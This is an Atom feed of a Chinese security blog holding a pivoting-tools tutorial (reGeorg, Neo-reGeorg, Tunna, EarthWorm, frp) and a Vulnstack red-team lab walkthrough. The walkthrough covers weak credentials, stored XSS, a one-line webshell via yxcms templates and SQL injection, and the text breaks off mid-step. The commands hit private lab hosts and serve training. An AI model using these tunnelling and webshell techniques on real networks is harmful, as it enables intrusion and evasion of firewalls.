<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hdys0vn&#39;s Blog</title>
  
  <subtitle>向着光亮那方</subtitle>
  <link href="https://hdys0vn.github.io/atom.xml" rel="self"/>
  
  <link href="https://hdys0vn.github.io/"/>
  <updated>2022-03-20T05:24:10.620Z</updated>
  <id>https://hdys0vn.github.io/</id>
  
  <author>
    <name>Hdys0vn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列二</title>
    <link href="https://hdys0vn.github.io/2022/03/20/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/"/>
    <id>https://hdys0vn.github.io/2022/03/20/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/</id>
    <published>2022-03-20T05:24:10.000Z</published>
    <updated>2022-03-20T05:24:10.620Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>内网渗透端口转发与代理工具总结</title>
    <link href="https://hdys0vn.github.io/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"/>
    <id>https://hdys0vn.github.io/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-21T12:45:42.000Z</published>
    <updated>2022-03-23T13:24:11.656Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>构建内网隐蔽通道，从而突破各种安全策略限制，实现对目标服务器的完美控制。<br>当我们从外网成功获得攻击点的时候，通过反弹shell、端口转发、内网穿透等技巧，来进一步入侵内网服务器。当我们取得内网目标服务器的控制权限，通过隧道技术绕过网络限制，实现隐蔽C2服务器的通信。</p><p>网络拓扑：</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323154340918.png"></p><p>网络配置IP如下：</p><pre class="line-numbers language-none"><code class="language-none">攻击机：win10：192.168.1.kali：192.168.1.5靶场：VM1：对外边界服务器，win7192.168.52.143192.168.1.9VM2：域成员，2003192.168.52.141VM3：域控，2008192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-reGeorge-内网穿透"><a href="#0x01-reGeorge-内网穿透" class="headerlink" title="0x01 reGeorge 内网穿透"></a>0x01 reGeorge 内网穿透</h2><h3 id="1-1-环境"><a href="#1-1-环境" class="headerlink" title="1.1 环境"></a>1.1 环境</h3><p>攻击机kali<br>reGeorge软件，下载：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>运行程序需要的环境：<br>Python、pip、urllib3；</p><h3 id="1-2-部署配置"><a href="#1-2-部署配置" class="headerlink" title="1.2 部署配置"></a>1.2 部署配置</h3><p>上传tunnel.nosocket.php<br>前提条件，已获得跳板机的权限，并且跳板机的server是php环境，将reGeorge中的tunnel.nosocket.php上传至网站</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323155438420.png"></p><p>并访问<a href="http://192.168.1.9/tunnel.nosocket.php">http://192.168.1.9/tunnel.nosocket.php</a><br>访问成功</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323155548224.png"></p><p>表示本地1080端口的流量都转发给指定的那个url，1080是指定的监听端口；</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323162728141.png"></p><p>配置代理<br>然后配置proxychains代理链的配置文件vim &#x2F;etc&#x2F;proxychains.conf，将代理设置成本机的1080端口：socks5 127.0.0.1 1080</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323163201935.png"></p><h3 id="1-3-测试"><a href="#1-3-测试" class="headerlink" title="1.3 测试"></a>1.3 测试</h3><p>命令前面加上proxychains 运行命令，测试下能否使用nmap扫描内网目标机win2008</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -p22,80,3306 -n -sT -PN 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323164353406.png"></p><p>reGeorg控制端</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323164609249.png"></p><h2 id="0x02-Neo-reGeorg"><a href="#0x02-Neo-reGeorg" class="headerlink" title="0x02 Neo-reGeorg"></a>0x02 Neo-reGeorg</h2><h3 id="1-1-使用"><a href="#1-1-使用" class="headerlink" title="1.1 使用"></a>1.1 使用</h3><p>设置密码并生成隧道文件，运行后会生成一个neoreg_server目录，里面包含了各种语言类型的隧道文件</p><pre class="line-numbers language-none"><code class="language-none"># python3 neoreg.py generate -k 123456[+] Create neoreg server files:    &#x3D;&gt; neoreg_server&#x2F;key.txt.   # 密码    &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php    &#x3D;&gt; neoreg_server&#x2F;tunnel.js    &#x3D;&gt; neoreg_server&#x2F;tunnel.php    &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx    &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx    &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp    &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx    &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp    &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165313062.png"></p><h3 id="1-2-部署配置-1"><a href="#1-2-部署配置-1" class="headerlink" title="1.2 部署配置"></a>1.2 部署配置</h3><p>上传tunnel.php<br>前提条件，已获得跳板机的权限（都打到内网了，跳板机的权限肯定获得了），server-bt系统的跳板机是php环境，将reGeorge中的tunnel.php上传至网站</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165438974.png"></p><p>并访问<a href="http://192.168.1.9/tunnel.php">http://192.168.1.9/tunnel.php</a><br>访问成功</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165539584.png"></p><p>启动Neo-reGeorg</p><pre class="line-numbers language-none"><code class="language-none">python3 neoreg.py -k 123456 -u http:&#x2F;&#x2F;192.168.1.9&#x2F;tunnel.php#表示本地1080端口的流量都转发给指定的那个url，1080是指定的监听端口；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165853324.png"></p><p>配置代理<br>然后配置proxychains代理链的配置文件vim &#x2F;etc&#x2F;proxychains.conf，将代理设置成本机的1080端口：</p><pre class="line-numbers language-none"><code class="language-none">socks5 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323163201935.png"></p><h3 id="1-3-测试-1"><a href="#1-3-测试-1" class="headerlink" title="1.3 测试"></a>1.3 测试</h3><p>命令前面加上proxychains 运行命令，（跳板机php环境已启动，存在主页index.php）</p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http:&#x2F;&#x2F;192.168.52.143<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323170043720.png"></p><h2 id="0x03-Tunna"><a href="#0x03-Tunna" class="headerlink" title="0x03 Tunna"></a>0x03 Tunna</h2><p>Tunna:可以通过HTTP封装隧道通信任何TCP，以及用于绕过防火墙环境中的网络限制</p><pre class="line-numbers language-none"><code class="language-none">常用参数：-u 远程代理脚本地址-l 表示本地监听的端口-r 远程映射端口-v 输出详细数据-a 代理远程连接的主机地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传conn.php到已控制的跳板主机上</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323170933348.png"></p><p>在攻击机上访问<a href="http://192.168.1.9/conn.php">http://192.168.1.9/conn.php</a></p><p>在攻击主机上执行命令，将内网服务器（192.168.52.138）的80端口映射到本地5555端口</p><pre class="line-numbers language-none"><code class="language-none">python proxy.py -u http:&#x2F;&#x2F;192.168.1.9&#x2F;conn.php -l 5555 -a 192.168.52.138 -r 80 –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323174156617.png"></p><p>在攻击机上即可访问内网服务器的80端口</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323174249007.png"></p><h2 id="0x04-Earthworm-Socks5代理"><a href="#0x04-Earthworm-Socks5代理" class="headerlink" title="0x04 Earthworm Socks5代理"></a>0x04 Earthworm Socks5代理</h2><p>EW 是一套便携式全平台的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透</p><p>Github第三方下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/0b2f286b2f629240f2e29556af172099.png" alt="image-20211220130325406" style="zoom: 80%;"><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处</p><h3 id="1-1-正向代理"><a href="#1-1-正向代理" class="headerlink" title="1.1 正向代理"></a>1.1 正向代理</h3><p>将 ew win 版放到跳板机上，使用以下命令启动代理</p><pre class="line-numbers language-none"><code class="language-none">ew_for_Win.exe -s ssocksd -l 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201205508.png"></p><p>设置<code>/etc/proxychains.conf</code>文件</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.9 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置后使用代理访问即可</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201242826.png"></p><h3 id="1-2-反向代理"><a href="#1-2-反向代理" class="headerlink" title="1.2 反向代理"></a>1.2 反向代理</h3><p>如果内网存在防火墙，正向连接很可能会被拦截，这是可以使用反向代理来突破防火墙限制，从内部连接外部</p><ol><li><p>在跳板机上执行命令，开启端口转发</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe -s rcsocks -l <span class="token number">7777</span> -e <span class="token number">1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201557951.png"></p></li><li><p>在内网目标机win2008上执行命令，开启代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe -s rssocks -d <span class="token number">192.168</span>.52.143 -e <span class="token number">1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323202022099.png" alt="image-20220323202022099"></p></li><li><p>攻击者修改配置文件在<code>/etc/proxychins.conf</code>增加<code>socks5 192.1.9 7777</code></p><p>设置完毕后攻击者即可使用代理访问内网目标机win2008，但是整个过程需要三方都参与，而且需要内网主机上传 EW 和启动，无疑是复杂度提升，适用于已经拿到内网主机权限的情况</p></li></ol><h2 id="0x05-Frp-穿透"><a href="#0x05-Frp-穿透" class="headerlink" title="0x05 Frp 穿透"></a>0x05 Frp 穿透</h2><p>项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>frp 是一个可用于内网穿透的高性能的全平台反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网Frp 分为服务端和客户端</p><p>服务端只能为 Linux 负责处理请求，转发流量<br>客户端 linux 和 windows 都支持 负责把本地的流量连到服务器，让服务器读取&amp;写入</p><p>在kali攻击机设置frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323204509073.png"></p><p>在跳板机上设置frpc.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; 192.168.1.5server_port &#x3D; 6666[http_proxy]type&#x3D;tcpremote_port&#x3D;7777plugin&#x3D;socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323204838866.png"></p><p>再在攻击机上面配置proxychains代理，即可访问到内网目标机</p><pre class="line-numbers language-none"><code class="language-none">socks 192.168.1.5 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样使用nmap扫描内网目标机win2008</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323205355590.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;构建内网隐蔽通道，从而突破各种安全策略限制，实现对目标服务器的完美控制。&lt;br&gt;当我们从外网成功获得</summary>
      
    
    
    
    
    <category term="端口转发" scheme="https://hdys0vn.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列一</title>
    <link href="https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/"/>
    <id>https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/</id>
    <published>2021-10-16T00:14:03.000Z</published>
    <updated>2022-03-20T05:21:00.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）"><a href="#ATT-amp-CK红队评估实战靶场（一）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一）"></a>ATT&amp;CK红队评估实战靶场（一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>一直想要学习内网知识，看了很多文章，感觉还是眼高手低，整个靶场打下来还是不太顺利，自己很多知识点也是有点模糊，不说了菜鸡是好菜啊！！！</p><p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316081903337.png"></p><h2 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083407043.png"></p><h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>​    发现IP192.168.1.102，使用nmap探测其端口开放情况</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083633458.png"></p><p>​    发现80端口开启，访问页面<code>http://192.168.1.103/</code>发现页面如下，存在大量信息泄露，收集有效信息</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083750415.png"></p><h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>​    使用使用御剑目录扫描专业版进行目录扫描(网站目录扫描的全面及准确性与字典有关，良好的字典能够发现别人发现不了的目录)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316085429546.png"></p><p>​    发现网站备份文件和phpadmin后台管理界面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090035081.png"></p><p>​    打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.3/yxcms</code>进入网站首页</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090223570.png"></p><h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>​    网站泄露后台地址和用户密码，且用户密码为弱口令</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090332375.png"></p><p>​    成功登陆网站后台</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090504559.png"></p><h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2 漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2 漏洞二：PhpMyAdmin弱口令</h5><p>​    发现使用默认用户名&#x2F;口令（root&#x2F;root）成功登录PhpMyAdmin管理页面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090650585.png"></p><h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞</h5><p>​    前台提交带有XSS代码的留言</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091444360.png"></p><p>​    后台审核时成功弹出xss窗口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091557461.png"></p><p>​    审核通过后在网站留言板部分也会弹出xss弹窗</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091847996.png"></p><p>​    可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p><h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞</h5><p>​    在后台创建新模板模块创建内容为一句话的新模板</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316111906759.png"></p><p>通过前面的备份文件可知文件保存的目录</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.3&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100450964-1245106639.png"></p><p>​    使用蚁剑成功连接shell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112139929.png"></p><h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5 漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5 漏洞五：yxcms后台SQL注入漏洞</h5><p>​    在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p><h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>​    